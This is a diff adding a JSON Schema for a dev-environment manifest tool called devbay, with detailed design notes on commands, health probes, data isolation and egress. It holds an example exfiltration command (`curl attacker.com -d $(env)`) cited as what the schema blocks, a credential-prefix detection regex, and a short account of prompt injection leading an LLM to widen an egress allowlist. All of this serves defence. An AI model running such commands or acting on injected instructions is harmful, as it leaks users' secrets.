@@ -1,0 +1,389 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "$id": "https://devbay.dev/spec/devbay.schema.json",
+  "title": "devbay manifest",
+  "description": "Declarative description of how a repository runs, so that isolated parallel instances of it (bays) can be booted, health-probed, and torn down deterministically. Designed to be safe to generate with an LLM: see the rules R1-R7 documented on each construct.",
+
+  "type": "object",
+  "additionalProperties": false,
+  "required": ["version", "project", "services", "tasks"],
+
+  "properties": {
+    "version": {
+      "const": 1,
+      "description": "Manifest schema version. Only 1 exists."
+    },
+
+    "project": {
+      "$ref": "#/$defs/slug",
+      "description": "Project identifier. Used as a DNS label in bay hostnames (<service>.<bay>.<project>.localhost) and to namespace containers, networks, volumes, and seed images."
+    },
+
+    "services": {
+      "type": "object",
+      "description": "Long-running processes. Every service is a container (devbay is containers-only).",
+      "minProperties": 1,
+      "propertyNames": { "$ref": "#/$defs/slug" },
+      "additionalProperties": { "$ref": "#/$defs/service" }
+    },
+
+    "tasks": {
+      "type": "object",
+      "description": "Named, finite commands an agent or human can run against a bay (test, lint, migrate). Each declares the service subgraph it needs, which is what lets devbay materialize only those containers.",
+      "propertyNames": { "$ref": "#/$defs/slug" },
+      "additionalProperties": { "$ref": "#/$defs/task" }
+    },
+
+    "externals": {
+      "type": "object",
+      "description": "Third-party dependencies and how to satisfy them locally. The default is always an emulator; a real credential requires explicit per-bay human approval.",
+      "propertyNames": { "$ref": "#/$defs/slug" },
+      "additionalProperties": { "$ref": "#/$defs/external" }
+    },
+
+    "supervision": {
+      "type": "object",
+      "additionalProperties": false,
+      "description": "Controls the per-bay identity surface injected by the proxy.",
+      "properties": {
+        "banner": {
+          "type": "boolean",
+          "default": true,
+          "description": "Inject the freshness banner into text/html responses. Disable when it collides with a fixed header. Favicon tinting is a server-side image transform and is not affected by this setting."
+        },
+        "favicon_tint": { "type": "boolean", "default": true }
+      }
+    }
+  },
+
+  "$defs": {
+
+    "slug": {
+      "type": "string",
+      "pattern": "^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$",
+      "description": "A DNS-safe label: lowercase alphanumerics and hyphens, 1-63 chars, no leading or trailing hyphen."
+    },
+
+    "duration": {
+      "type": "string",
+      "pattern": "^[0-9]+(ms|s|m)$",
+      "description": "A duration such as 500ms, 30s, or 2m."
+    },
+
+    "argv": {
+      "type": "array",
+      "minItems": 1,
+      "items": { "type": "string" },
+      "description": "R1 - COMMANDS ARE ARGV ARRAYS, NEVER SHELL STRINGS. Executed with execve, not `sh -c`. No pipes, no &&, no $(), no globbing, no redirection. A string where this array is expected is a validation error and must never be coerced. This single constraint means an injected manifest cannot express `curl attacker.com -d $(env)`; there is no path from manifest to arbitrary shell.\n\nR2 - argv[0] is checked against the allowlist in $defs/argv0_allowlist. Values outside the allowlist are permitted but require one-time human approval, keyed by a hash of the full argv array and displayed verbatim. Approval is invalidated when any element changes. The allowlist is deliberately not enforced by this schema, because rejecting outright would force users to fork; enforcement lives in the validator, which can prompt."
+    },
+
+    "argv0_allowlist": {
+      "description": "Reference list consumed by the validator. argv[0] outside this list is allowed only after explicit human approval of the exact argv array. This is an annotation, not a constraint - see $defs/argv.",
+      "type": "array",
+      "items": { "type": "string" },
+      "default": [
+        "npm", "npx", "pnpm", "pnpx", "yarn", "bun", "bunx", "deno", "node",
+        "pip", "pip3", "python", "python3", "poetry", "uv", "uvx", "pytest", "gunicorn", "uvicorn", "celery", "alembic",
+        "bundle", "bundler", "ruby", "rake", "rails", "rspec", "puma", "sidekiq",
+        "go", "gofmt",
+        "cargo",
+        "php", "composer", "phpunit", "artisan",
+        "make", "just", "mise", "task",
+        "jest", "vitest", "playwright", "cypress",
+        "prisma", "knex", "sequelize", "typeorm", "drizzle-kit", "atlas", "migrate", "goose", "dbmate",
+        "psql", "pg_isready", "mysql", "mysqladmin", "redis-cli",
+        "true"
+      ]
+    },
+
+    "interpolated": {
+      "type": "string",
+      "description": "R7 - INTERPOLATION IS LIMITED TO TWO NAMESPACES. Only ${bay.<service>.<field>} and ${secret:<path>} are permitted. No arbitrary expressions, no nesting, no environment passthrough. Any other ${...} sequence is a validation error.\n\nThe bay namespace is ADDRESS-PLANE AWARE, which is the single most important detail in this schema:\n  ${bay.<svc>.url}         resolves to the container-network address (http://<svc>:<port>) when injected into a container, and to http://127.0.0.1:<allocated> when returned to the host or to an agent over MCP.\n  ${bay.<svc>.public_url}  resolves to the browser-facing origin (https://<svc>.<bay>.<project>.localhost).\n  ${bay.<svc>.ports.<name>} resolves a secondary port declared in that service's `ports` map.\nServer-side variables want `url`. Browser-exposed variables (NEXT_PUBLIC_*, VITE_*, REACT_APP_*) want `public_url`. Confusing the two is the most common cause of 'works in the browser, breaks in SSR', because *.localhost does not resolve through getaddrinfo - only Chrome, Firefox, and curl special-case it.\n\nThe regex below is written without lookahead so that it is valid under RE2 (Go) as well as ECMA-262.",
+      "pattern": "^(?:[^$]|\\$\\{(?:bay\\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.(?:url|public_url|host|port|name|user|password|ports\\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)|secret:[A-Za-z0-9/_.:-]+)\\}|\\$[^{])*\\$?$",
+      "not": {
+        "description": "R3 - SECRETS ARE REFERENCES ONLY. A literal credential must never appear in the manifest, because the manifest is committed and reviewed in pull requests. This rejects well-known credential prefixes; the validator additionally applies an entropy heuristic, which a schema cannot express.",
+        "pattern": "(sk_live_|sk_test_|rk_live_|pk_live_|ghp_|gho_|ghu_|ghs_|ghr_|github_pat_|glpat-|AKIA|ASIA|ya29\\.|AIza|xox[baprse]-|npm_|dop_v1_|sk-ant-|-----BEGIN [A-Z ]*PRIVATE KEY-----)"
+      }
+    },
+
+    "env": {
+      "type": "object",
+      "description": "Environment variables. Values are interpolated per R7 and screened per R3.",
+      "propertyNames": {
+        "type": "string",
+        "pattern": "^[A-Za-z_][A-Za-z0-9_.]*$",
+        "description": "POSIX reserves [A-Za-z_][A-Za-z0-9_]* for environment names, but dots are permitted here because real images require them: Elasticsearch is configured with discovery.type and xpack.security.enabled, and JVM-based images follow the same convention."
+      },
+      "additionalProperties": { "$ref": "#/$defs/interpolated" }
+    },
+
+    "health": {
+      "type": "object",
+      "additionalProperties": false,
+      "description": "R5 - HEALTH IS MANDATORY FOR EVERY LONG-RUNNING SERVICE. Without a health probe there is no verification loop, and without a verification loop auto-detection is only guessing. Exactly one of http, tcp, cmd, log, or process must be given. (A service with `kind: oneshot` is exempt: its exit code is the probe.)\n\nProbes are always performed from the host over 127.0.0.1:<allocated port> (address plane 2), never against a *.localhost hostname, which the daemon's own resolver cannot resolve.\n\nThe five forms exist because real repositories contain processes that expose nothing to probe. A Sidekiq worker, a Celery worker, an asset-build watcher such as Vite in a Rails app, and a background job runner all have no port and no meaningful readiness command. Forcing those to declare an HTTP probe would produce a fake one, which is worse than an honest weak one - so `log` and `process` exist, in that order of preference.",
+      "properties": {
+        "http": {
+          "type": "string",
+          "pattern": "^/",
+          "description": "Path probed on this service's port. Healthy when the status is 2xx or 3xx."
+        },
+        "tcp": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 65535,
+          "description": "Port that must accept a TCP connection. Use for datastores with no HTTP surface."
+        },
+        "cmd": {
+          "$ref": "#/$defs/argv",
+          "description": "Command executed inside the container; healthy on exit code 0. Use for services where a connect is not proof of readiness, e.g. [pg_isready, -U, postgres] or [redis-cli, ping]."
+        },
+        "log": {
+          "type": "string",
+          "description": "Regular expression (RE2 syntax) matched against the service's stdout and stderr; healthy on first match. This is the preferred probe for processes with no port, and is often better than an HTTP probe for dev servers, which print an explicit ready line - 'ready in 412 ms' for Vite, 'Listening on' for Puma, 'ready - started server on' for Next. Matching a ready line is real readiness, not merely liveness."
+        },
+        "process": {
+          "const": true,
+          "description": "Liveness only: the service is healthy as long as its main process is still running after `start_period`. The weakest probe available and the validator warns when it is used. It exists because the alternative - inventing a fake HTTP endpoint for a Sidekiq or Celery worker - is a lie that silently defeats the verification loop. Prefer `log` whenever the process prints anything deterministic on startup."
+        },
+        "timeout": { "$ref": "#/$defs/duration", "default": "30s", "description": "Total time to reach healthy before the boot is declared failed." },
+        "interval": { "$ref": "#/$defs/duration", "default": "500ms" },
+        "start_period": { "$ref": "#/$defs/duration", "default": "0s", "description": "Grace period during which failures are not counted, for services with slow first-run migrations." }
+      },
+      "oneOf": [
+        { "required": ["http"] },
+        { "required": ["tcp"] },
+        { "required": ["cmd"] },
+        { "required": ["log"] },
+        { "required": ["process"] }
+      ]
+    },
+
+    "service": {
+      "type": "object",
+      "additionalProperties": false,
+
+      "properties": {
+
+        "kind": {
+          "enum": ["service", "oneshot"],
+          "default": "service",
+          "description": "`service` is a long-running process. `oneshot` runs to completion and is healthy on exit code 0.\n\nOneshot exists because every real repository has ordering-sensitive setup - run migrations, then seed, then start the app - and expressing that as a global list of setup commands gets the ordering wrong: migrations must finish BEFORE the app starts, not after every service is healthy. Modelling each step as a oneshot service means `needs` alone expresses the ordering, each step gets its own container, logs, and failure surface, and there is exactly one dependency mechanism in the manifest instead of two.\n\nA oneshot requires `run` and does not require `health`. Depending on a oneshot via `needs` means 'wait for it to exit successfully'."
+        },
+
+        "image": {
+          "type": "string",
+          "description": "Container image. Should be pinned by digest (name@sha256:...); the validator warns on a floating tag and refuses an unpinned image from a registry outside the allowlist. Mutually exclusive with `build`.",
+          "pattern": "^[a-zA-Z0-9][a-zA-Z0-9._/-]*(:[a-zA-Z0-9._-]+)?(@sha256:[a-f0-9]{64})?$"
+        },
+
+        "build": {
+          "type": "object",
+          "additionalProperties": false,
+          "description": "Build an image from the repo instead of pulling one. Mutually exclusive with `image`.",
+          "properties": {
+            "context": { "type": "string", "default": "." },
+            "dockerfile": { "type": "string", "default": "Dockerfile" },
+            "target": { "type": "string", "description": "Multi-stage build target. Dev stages are usually the right one." }
+          }
+        },
+
+        "scope": {
+          "enum": ["bay", "shared"],
+          "default": "bay",
+          "description": "`bay` is one instance per bay - the normal case, including datastores. `shared` is one instance total, forked per bay; use only when an instance is genuinely expensive to duplicate. Note that per-bay Postgres containers started from a seeded image cost roughly 30-50 MB each and give copy-on-write for free via the image layer, which is almost always better than sharing one instance and forking inside it."
+        },
+
+        "fork": {
+          "enum": ["image", "template", "prefix", "schema", "none"],
+          "default": "image",
+          "description": "How per-bay data isolation is achieved for a stateful service.\n\n  image    - DEFAULT. Migrations and seed data are baked into a per-project image at build time; each bay runs its own container from it and the container's writable layer provides copy-on-write. Instant, parallelisable, and teardown is a container removal, so a leaked fork is structurally impossible.\n  template - Postgres CREATE DATABASE ... TEMPLATE. Note this is a full O(size) physical copy, not copy-on-write: no other session may be connected to the template during the copy, so forks SERIALIZE, and a multi-gigabyte database takes tens of seconds each. Only choose this for a genuinely shared instance with a small dataset.\n  prefix   - key namespace prefix, for Redis and similar.\n  schema   - separate schema inside one database.\n  none     - genuinely shared with no isolation. Requires explicit opt-in and is warned about, because one bay's writes will be visible to every other."
+        },
+
+        "seed": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": ["after", "sources"],
+          "description": "Defines the seeded state captured into this service's image for `fork: image`.\n\nSeeding is expressed as ordinary `kind: oneshot` services rather than as commands here, because a migration does not run inside the database container - it runs inside the application container, against the database, using the application's own toolchain and dependency tree. A command written here would have no unambiguous place to execute. Naming oneshot services instead makes the execution context explicit, reuses the one dependency mechanism the manifest already has, and gives each seeding step its own logs and failure surface.\n\nOn first boot devbay runs the named oneshots, then commits the service's data directory as the project's seed image. Every later bay starts from that image and pays nothing.",
+          "properties": {
+            "after": {
+              "type": "array",
+              "minItems": 1,
+              "items": { "$ref": "#/$defs/slug" },
+              "description": "Oneshot services whose successful completion defines the seeded state, in dependency order."
+            },
+            "sources": {
+              "type": "array",
+              "minItems": 1,
+              "items": { "type": "string" },
+              "description": "Globs whose content hash decides when the seed image is stale, e.g. [\"prisma/migrations/**\", \"prisma/seed.ts\"]. Changing a migration rebuilds the image; changing application code does not."
+            }
+          }
+        },
+
+        "workdir": { "type": "string", "description": "Working directory inside the container. Defaults to the mounted worktree root." },
+
+        "install": {
+          "$ref": "#/$defs/argv",
+          "description": "Dependency installation, run before `start` and cached across boots of the same bay."
+        },
+
+        "install_scripts": {
+          "type": "boolean",
+          "default": false,
+          "description": "Whether to permit package lifecycle scripts (npm preinstall/postinstall and equivalents) during `install`. FALSE BY DEFAULT: devbay appends --ignore-scripts, or the ecosystem equivalent. Running install scripts on a freshly cloned untrusted repository is the exact delivery mechanism used by the self-replicating Shai-Hulud npm worm, which steals cloud credentials. Setting this to true is approval-gated."
+        },
+
+        "start": {
+          "$ref": "#/$defs/argv",
+          "description": "The long-running process. Omit for services whose image already has a correct entrypoint, such as stock postgres or redis. Mutually exclusive with `run`."
+        },
+
+        "run": {
+          "$ref": "#/$defs/argv",
+          "description": "The command for a `kind: oneshot` service. Runs to completion; success is exit code 0."
+        },
+
+        "port": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 65535,
+          "description": "The PRIMARY port this service listens on inside its container - the one that gets a hostname and, unless overridden, the one `health.http` probes. devbay maps it to a host port drawn from the bay's allocated block; the number here is never rewritten, so the app needs no port-offset awareness. Exactly one primary port exists per service so that hostname routing is unambiguous; see `ports` for the rest."
+        },
+
+        "ports": {
+          "type": "object",
+          "description": "Additional named ports beyond the primary. Real services routinely expose more than one and a single integer cannot describe them: a mail catcher listens on SMTP and serves a web UI, an object store serves an S3 API and a console, a streaming server exposes metrics.\n\nEach name becomes a routable subdomain (<name>.<service>.<bay>.<project>.localhost) and is referenceable as ${bay.<service>.ports.<name>}.",
+          "propertyNames": { "$ref": "#/$defs/slug" },
+          "additionalProperties": { "type": "integer", "minimum": 1, "maximum": 65535 }
+        },
+
+        "primary": {
+          "type": "boolean",
+          "default": false,
+          "description": "This service claims the bare <bay>.<project>.localhost hostname. Inferred when exactly one service exposes a port; must be declared explicitly otherwise."
+        },
+
+        "needs": {
+          "type": "array",
+          "items": { "$ref": "#/$defs/slug" },
+          "default": [],
+          "description": "Services that must be healthy before this one starts. Must form a DAG; a cycle is a validation error."
+        },
+
+        "health": { "$ref": "#/$defs/health" },
+
+        "watch": {
+          "type": "array",
+          "items": { "type": "string" },
+          "description": "Globs, relative to the worktree root, that trigger `watch_action` when they change.\n\nWatching is performed BY THE DAEMON ON THE HOST using native FSEvents or inotify, and never by a watcher inside the container. virtiofs does not implement inotify - the kernel patches were never merged - so host edits do not reliably produce inotify events inside a container on macOS, and the usual workaround of polling costs real CPU per watcher per bay. Declaring globs here is what replaces polling."
+        },
+
+        "watch_action": {
+          "enum": ["restart", "sync", "rebuild"],
+          "default": "restart",
+          "description": "sync copies changed files in; restart restarts the process; rebuild re-runs install and restarts."
+        },
+
+        "volumes": {
+          "type": "array",
+          "items": { "type": "string" },
+          "description": "Paths, relative to the worktree root, backed by a named volume instead of the host bind mount - node_modules, .venv, vendor/bundle, target, .next. This is not an optimisation to defer: a bind-mounted dependency tree runs at roughly 2.5x native on macOS, and moving it to a named volume recovers near-native performance on every runtime."
+        },
+
+        "egress": {
+          "type": "array",
+          "items": { "type": "string", "format": "hostname" },
+          "description": "R4 - EGRESS IS DECLARED PER SERVICE. Any destination not listed is blocked. An absent or empty list means no outbound network at all. Besides limiting the blast radius of a compromised dependency, this is what catches a malicious postinstall script phoning home.\n\nTHIS KEY IS NOT AUTHORABLE BY THE INTROSPECTION AGENT. The validator strips `egress` from any LLM-produced manifest and requires it to come from the curated default policy or a human edit. If a model could write the allowlist, a prompt injection would simply append its own destination and the sandbox would defeat itself."
+        },
+
+        "env": { "$ref": "#/$defs/env" }
+      },
+
+      "oneOf": [
+        { "required": ["image"] },
+        { "required": ["build"] }
+      ],
+
+      "allOf": [
+        {
+          "description": "A oneshot needs a command to run and is exempt from R5, because its exit code is the probe. A long-running service needs a health probe and must not use `run`.",
+          "if": { "properties": { "kind": { "const": "oneshot" } }, "required": ["kind"] },
+          "then": {
+            "required": ["run"],
+            "not": { "anyOf": [{ "required": ["start"] }, { "required": ["health"] }, { "required": ["port"] }] }
+          },
+          "else": {
+            "required": ["health"],
+            "not": { "required": ["run"] }
+          }
+        }
+      ],
+
+      "dependentRequired": {
+        "seed": ["fork"]
+      }
+    },
+
+    "task": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["run", "needs"],
+      "description": "R6 - EVERY TASK DECLARES `needs`. An empty array is valid and common: a unit test suite that boots zero containers is the fastest possible path to a verified result, and is the main reason the p50 target for unit tests is under ten seconds. Omitting `needs` is an error rather than a default, because forcing the author to think about it is the point.",
+      "properties": {
+        "run": { "$ref": "#/$defs/argv" },
+        "needs": {
+          "type": "array",
+          "items": { "$ref": "#/$defs/slug" },
+          "description": "The service subgraph this task requires. Only these services and their transitive `needs` are materialized."
+        },
+        "in": {
+          "$ref": "#/$defs/slug",
+          "description": "Service whose container the task runs in. Defaults to the primary service, or to a throwaway container built from it when the task needs no running services."
+        },
+        "report": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": ["format"],
+          "description": "Where the runner writes machine-readable results, so that a failure reaches an agent as a typed object rather than as stdout to be scraped. This is the difference between an agent that fixes its own test and one that flails. There is no cross-language standard for this; JUnit XML is the universal fallback and native streaming JSON is preferred where it exists.\n\n`path` is omitted for formats that stream to stdout rather than writing a file - notably `go test -json`, whose event stream is parsed incrementally and therefore gives live progress that a report file cannot.",
+          "properties": {
+            "format": {
+              "enum": ["junit", "json", "go-json", "tap"],
+              "description": "junit   - JUnit XML. Emitted natively by pytest (--junit-xml), phpunit (--log-junit) and vitest, and by one well-maintained package for jest, rspec, go and cargo.\njson    - Jest-shaped JSON, emitted by `jest --json` and `vitest --reporter=json`.\ngo-json - the newline-delimited event stream from `go test -json`, parsed incrementally for live progress.\ntap     - last resort.\n\nNote for Rust: `cargo test --format json` is nightly-only and has been for years, so cargo-nextest is required."
+            },
+            "path": { "type": "string", "description": "Path relative to the worktree root." }
+          }
+        },
+        "env": { "$ref": "#/$defs/env" },
+        "timeout": { "$ref": "#/$defs/duration", "default": "10m" }
+      }
+    },
+
+    "external": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["emulate"],
+      "description": "A third-party dependency and how it is satisfied locally. The default is always the emulator, which is the highest-leverage security decision available here: most bays then need zero real credentials, and the ones that do are a short list a human actually looked at.",
+      "properties": {
+        "emulate": {
+          "type": "string",
+          "description": "Emulator identifier, e.g. stripe-mock, mailpit, minio, localstack, wiremock. Mailpit rather than MailHog, which has been unmaintained since 2020. The S3 provider is deliberately not fixed by devbay: LocalStack's community image was archived in March 2026 and now requires an auth token, and MinIO's community edition is in maintenance mode."
+        },
+        "real": {
+          "enum": ["never", "gated"],
+          "default": "gated",
+          "description": "`gated` means a real credential may be bound after explicit human approval, recorded per bay with a timestamp in the append-only audit log. `never` means the emulator is the only option. There is deliberately no `always`."
+        },
+        "mint": {
+          "type": "object",
+          "additionalProperties": false,
+          "description": "How to mint a short-lived scoped credential instead of passing a long-lived one through. Preferred wherever the provider supports it.",
+          "properties": {
+            "provider": { "enum": ["aws-sts", "github-app", "gcp-sa"] },
+            "ttl": { "$ref": "#/$defs/duration" },
+            "scope": { "type": "object", "description": "Provider-specific scoping: a session policy and role ARN for aws-sts, repository ids and permissions for github-app." }
+          }
+        }
+      }
+    }
+  }
+}
